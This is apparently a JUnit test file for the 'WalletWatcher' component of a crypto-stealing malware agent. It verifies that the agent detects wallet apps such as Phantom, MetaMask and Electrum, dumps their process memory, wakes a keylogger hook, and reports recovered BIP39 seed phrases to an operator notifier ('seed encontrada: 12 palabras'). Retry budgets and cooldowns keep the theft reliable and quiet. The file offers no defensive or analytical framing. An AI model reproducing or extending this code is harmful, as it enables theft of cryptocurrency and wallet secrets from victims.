package com.spcagentpayloa.jvmxx;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

class WalletWatcherTest {
	@TempDir
	Path temp;

	private Keylogger keylogger;

	private WalletWatcher watcher(OpsNotifier notifier) {
		State state = new State();
		state.walletsSet = true;
		state.walletsWatch = true;
		keylogger = new Keylogger(temp, temp, state, null, notifier);
		WalletWatcher watcher = new WalletWatcher(temp, temp, state, null, notifier, keylogger);
		watcher.enableForTest();
		return watcher;
	}

	private void markKeysRunning() throws Exception {
		java.nio.file.Path ops = AgentPaths.cache(temp).resolve("ops");
		java.nio.file.Files.createDirectories(ops);
		java.nio.file.Files.writeString(ops.resolve("keys.pid"),
			Long.toString(ProcessHandle.current().pid()));
	}

	@Test
	void aBounceWhileDumpingDoesNotConsumeTheAttemptBudget() throws Exception {
		OpsNotifier notifier = new OpsNotifier(null);
		WalletWatcher watcher = watcher(notifier);
		java.lang.reflect.Field dumping = WalletWatcher.class.getDeclaredField("dumping");
		dumping.setAccessible(true);
		dumping.setBoolean(watcher, true);
		dumping.setAccessible(false);
		long pid = ProcessHandle.current().pid();
		String key = "phantom|" + pid + "|x";
		for (String fieldName : new String[] {"activeKey", "activeName", "activePid"}) {
			java.lang.reflect.Field active = WalletWatcher.class.getDeclaredField(fieldName);
			active.setAccessible(true);
			if (fieldName.equals("activeKey")) active.set(watcher, key);
			else if (fieldName.equals("activeName")) active.set(watcher, "phantom");
			else active.setLong(watcher, pid);
		}
		java.lang.reflect.Method dump = WalletWatcher.class.getDeclaredMethod("dump", String.class, String.class, long.class, boolean.class);
		dump.setAccessible(true);
		dump.invoke(watcher, key, "phantom", pid, false);
		assertTrue(watcher.attempts.isEmpty(), "a bounce must not spend an attempt");
		java.lang.reflect.Field field = WalletWatcher.class.getDeclaredField("dumping");
		field.setAccessible(true);
		field.setBoolean(watcher, false);
		watcher.captureForTest((name, id) -> java.util.List.of());
		dump.invoke(watcher, key, "phantom", pid, false);
		assertEquals(1, watcher.attempts.get(key));
	}

	@Test
	void sameLiveProcessDumpsOnceAcrossAFocusBounce() {
		OpsNotifier notifier = new OpsNotifier(null);
		WalletWatcher watcher = watcher(notifier);
		long pid = ProcessHandle.current().pid();

		watcher.detect("phantom", pid, "start", "Phantom");
		watcher.lost("phantom");
		watcher.detect("phantom", pid, "start", "Phantom");

		assertEquals(1, watcher.dumpSchedules);
		assertEquals(List.of("wallet detected: phantom (" + pid + ")"), notifier.queued());
	}

	@Test
	void lostWhileThePidLivesKeepsTheSession() {
		OpsNotifier notifier = new OpsNotifier(null);
		WalletWatcher watcher = watcher(notifier);
		long pid = ProcessHandle.current().pid();

		watcher.detect("phantom", pid, "start", "Phantom");
		notifier.queued();
		watcher.lost("phantom");

		assertEquals(List.of(), notifier.queued());
	}

	@Test
	void lostAfterThePidDiedClearsAndCloses() throws Exception {
		OpsNotifier notifier = new OpsNotifier(null);
		WalletWatcher watcher = watcher(notifier);
		Process child = new ProcessBuilder("sleep", "60").start();
		long pid = child.pid();
		try {
			watcher.detect("phantom", pid, "start", "Phantom");
			assertTrue(child.isAlive());
		} finally {
			child.destroy();
			child.waitFor();
		}
		notifier.queued();

		watcher.lost("phantom");

		assertEquals(List.of("wallet closed"), notifier.queued());
	}

	@Test
	void graceLostClosesABrowserEvenWhileThePidLives() {
		OpsNotifier notifier = new OpsNotifier(null);
		WalletWatcher watcher = watcher(notifier);
		long pid = ProcessHandle.current().pid();
		watcher.detect("phantom", pid, "start", "Phantom");
		notifier.queued();

		watcher.lost("phantom", "grace");

		assertEquals(List.of("wallet closed"), notifier.queued());
	}

	@Test
	void graceLostKeepsADesktopWalletWhileThePidLives() throws Exception {
		OpsNotifier notifier = new OpsNotifier(null);
		WalletWatcher watcher = watcher(notifier);
		Process child = new ProcessBuilder("sleep", "60").start();
		long pid = child.pid();
		try {
			watcher.detect("electrum", pid, "start", "Electrum");
			notifier.queued();

			// A desktop focus bounce: the process still owns the wallet.
			watcher.lost("electrum", "grace");
			assertEquals(List.of(), notifier.queued());
		} finally {
			child.destroy();
			child.waitFor();
		}
	}

	@Test
	void deadLostClosesEvenIfThePidIsStillAlive() {
		OpsNotifier notifier = new OpsNotifier(null);
		WalletWatcher watcher = watcher(notifier);
		long pid = ProcessHandle.current().pid();
		watcher.detect("phantom", pid, "start", "Phantom");
		notifier.queued();

		watcher.lost("phantom", "dead");

		assertEquals(List.of("wallet closed"), notifier.queued());
	}

	@Test
	void reopeningPhantomInTheCooldownRestoresSilentlyAndWakesTheKeys() throws Exception {
		OpsNotifier notifier = new OpsNotifier(null);
		WalletWatcher watcher = watcher(notifier);
		long pid = ProcessHandle.current().pid();
		markKeysRunning();
		watcher.detect("phantom", pid, "start", "Phantom");
		notifier.queued();
		watcher.lost("phantom", "grace");
		notifier.queued();

		watcher.detect("phantom", pid, "start", "Phantom");

		assertEquals(List.of(), notifier.queued(), "no second alert inside the cooldown");
		assertEquals(1, watcher.dumpSchedules, "no second alert cycle for the same session");
		assertEquals(1, watcher.resumeSchedules, "the interrupted capture is resumed");
		assertEquals(2, keylogger.walletOnCalls, "the hook is woken again");
	}

	@Test
	void reopenAfterACompletedDumpDoesNotRepeatIt() throws Exception {
		OpsNotifier notifier = new OpsNotifier(null);
		WalletWatcher watcher = watcher(notifier);
		long pid = ProcessHandle.current().pid();
		markKeysRunning();
		watcher.detect("phantom", pid, "start", "Phantom");
		String key = "phantom|" + pid + "|start";
		watcher.completed.add(key);
		notifier.queued();
		watcher.lost("phantom", "grace");
		notifier.queued();

		watcher.detect("phantom", pid, "start", "Phantom");

		assertEquals(List.of(), notifier.queued());
		assertEquals(0, watcher.resumeSchedules, "a completed capture is not repeated");
		assertEquals(1, watcher.dumpSchedules);
	}

	@Test
	void reopeningAfterTheCooldownGetsAFreshAttemptBudget() {
		OpsNotifier notifier = new OpsNotifier(null);
		WalletWatcher watcher = watcher(notifier);
		long pid = ProcessHandle.current().pid();
		String key = "phantom|" + pid + "|start";
		watcher.detect("phantom", pid, "start", "Phantom");
		notifier.queued();
		watcher.attempts.put(key, 1);
		watcher.dumped.put(key, System.currentTimeMillis() - 700_000L);
		watcher.lost("phantom", "grace");
		notifier.queued();
		watcher.state.walletCooldownUntil = 0L;

		watcher.detect("phantom", pid, "start", "Phantom");

		assertEquals(List.of("wallet detected: phantom (" + pid + ")"), notifier.queued());
		assertEquals(2, watcher.dumpSchedules);
		assertNull(watcher.attempts.get(key), "browsers get a new single attempt");
	}

	@Test
	void deadLostReopensAsANewCycle() {
		OpsNotifier notifier = new OpsNotifier(null);
		WalletWatcher watcher = watcher(notifier);
		long pid = ProcessHandle.current().pid();
		watcher.detect("phantom", pid, "start", "Phantom");
		notifier.queued();
		watcher.lost("phantom", "dead");
		notifier.queued();
		watcher.state.walletCooldownUntil = 0L;

		watcher.detect("phantom", pid, "start", "Phantom");

		assertEquals(List.of("wallet detected: phantom (" + pid + ")"), notifier.queued());
		assertEquals(2, watcher.dumpSchedules);
	}

	@Test
	void findingsAreNotRepeatedBetweenDumps() {
		OpsNotifier notifier = new OpsNotifier(null);
		WalletWatcher watcher = watcher(notifier);
		var finding = new MemoryScanner.Finding(1L, "bip39-12", "unique dedupe seed", true);

		watcher.notifyFindings(List.of(finding));
		watcher.notifyFindings(List.of(finding));

		assertEquals(List.of("seed encontrada: 12 palabras", "unique dedupe seed"), notifier.queued());
	}

	@Test
	void findingsRecentlyAlertedByClipboardAreSkipped() {
		OpsNotifier notifier = new OpsNotifier(null);
		WalletWatcher watcher = watcher(notifier);
		String seed = "abandon abandon about";
		SecretDetector.alerted(seed);

		watcher.notifyFindings(List.of(new MemoryScanner.Finding(1L, "bip39-12", seed, false)));

		assertEquals(List.of(), notifier.queued());
	}

	@Test
	void browsersOnlyGetOneAttempt() {
		assertEquals(1, WalletWatcher.maxAttempts("phantom"));
		assertEquals(1, WalletWatcher.maxAttempts("metamask"));
		assertEquals(3, WalletWatcher.maxAttempts("electrum"));
		assertEquals(3, WalletWatcher.maxAttempts("exodus"));
	}

	@Test
	void cooldownBypassesOnlyTheFirstDetectAfterARestart() {
		OpsNotifier notifier = new OpsNotifier(null);
		WalletWatcher watcher = watcher(notifier);
		long pid = ProcessHandle.current().pid();
		String key = "phantom|" + pid + "|start";
		watcher.state.walletCooldownUntil = System.currentTimeMillis() + 600_000L;
		watcher.state.lastWalletKey = key;

		watcher.detect("phantom", pid, "start", "Phantom");
		assertEquals(1, watcher.dumpSchedules);

		watcher.stop();
		watcher.enableForTest();
		watcher.detect("phantom", pid, "start", "Phantom");

		assertEquals(1, watcher.dumpSchedules, "the second detect waits for the cooldown");
	}
}
